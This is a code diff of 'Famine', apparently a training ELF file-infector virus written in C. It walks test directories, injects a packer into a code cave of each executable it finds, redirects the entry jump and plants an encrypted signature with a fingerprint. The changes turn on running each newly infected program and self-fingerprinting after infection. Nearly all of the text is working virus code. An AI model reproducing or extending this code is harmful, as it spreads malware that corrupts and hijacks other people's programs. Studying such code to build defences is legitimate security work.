@@ -19,8 +19,8 @@ extern void end();
 void famine(void);
 void jmp_end(void);
 
-#define JMP_OFFSET 0x6
 #define JMP_SIZE 4
+
 /* 	pop	r10
 	pop	r9
 	pop	r8
@@ -75,23 +75,24 @@ static void init_patch(t_data *data, size_t jmp_rel_offset) {
 
 	t_patch *patch = &data->patch;
 
+	size_t signature_offset = (size_t)&sign - (size_t)&packer_start;
+
 	/* calculate the difference between the cave and the packer 
 	 * will always be positive cause .data is after the .text */
 	uint64_t addr_diff = data->cave.addr - data->packer.addr;
 
 	patch->jmp = (int32_t)(addr_diff - jmp_rel_offset - sizeof(int32_t) - 1);
 
-	char signature[43] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c" 
-						 "\x2e\x07\xcb\x01\x55\xe6\x7e\x5c\x67\x5f\xca\x0d\x45\xff\x77\x13\x3f\x13"
-						 "\x83\x49\x07\xae\x25\x76\x00";
+	char signature[SIGNATURE_SIZE];
+	ft_strlcpy(signature, sign, SIGNATURE_SIZE);
 
-	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);
+	/* "Famine (c)oded by dxrxbxk - straboul:0000", 0x0a, 0 
+	 * reset the hash to 0000 */
+	ft_memset(&signature[SIGNATURE_SIZE - 6], '0', 4);
 
 	update_fingerprint(&signature[ft_strlen(signature) - 14], data);
 
 	ft_strlcpy(patch->signature, signature, sizeof(patch->signature));
-
-	//patch->mprotect_size = data->data_page_size;
 
 	patch->decrypt_size = data->cave.p_size;
 
@@ -127,7 +128,7 @@ static int	inject(t_data *data) {
 
 	packer_patch(data);
 
-	uint8_t jmp_offset = (char *)&jmp_end - (char *)&_start + 1;
+	uint8_t jmp_offset = (uint8_t)((char *)&jmp_end - (char *)&_start + 1);
 
 	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->packer.old_entry, jmp_offset + JMP_SIZE);
 
@@ -194,14 +195,14 @@ static int	infect(const char *filename, const char *self_name)
 }
 
 
-static int execute_program(const char *filename)
+static int execute_prog(const char *filename)
 {
 	pid_t pid = _syscall(SYS_fork);
 	if (pid == 0) {
 
 		const char dev_null[] = "/dev/null";
 		int fd = _syscall(SYS_open, dev_null, O_RDONLY);
-		if (fd < 0)
+		if (fd == -1)
 			return 1;
 
 		if (_syscall(SYS_dup2, fd, 0) < 0) {
@@ -265,7 +266,7 @@ static void open_file(const char *file, const char *self_path, size_t *counter)
 
 				if (infect(new_path, self_path) == 0) {
 					(*counter)++;
-//					execute_program(new_path);
+					execute_prog(new_path);
 				}
 
 			} else if (dir->d_type == DT_DIR) {
@@ -284,8 +285,6 @@ static void open_file(const char *file, const char *self_path, size_t *counter)
 
 void	famine(void)
 {
-
-
 	size_t counter = 0;
 	char host_name[PATH_MAX];
 
@@ -293,7 +292,7 @@ void	famine(void)
 		((char[]){"/tmp/test1"}),
 		((char[]){"/tmp/test2"}),
 		((char[]){"./tmp"}),
-		(void *)0,
+		NULL
 	};
 
 	if (self_name(host_name) != 0) {
@@ -303,7 +302,7 @@ void	famine(void)
 	for (int i = 0; paths[i]; ++i)
 		open_file(paths[i], host_name, &counter);
 
-//	if (counter != 0) {
-//		self_fingerprint(host_name, counter);
-//	}
+	if (counter != 0) {
+		self_fingerprint(host_name, counter);
+	}
 }
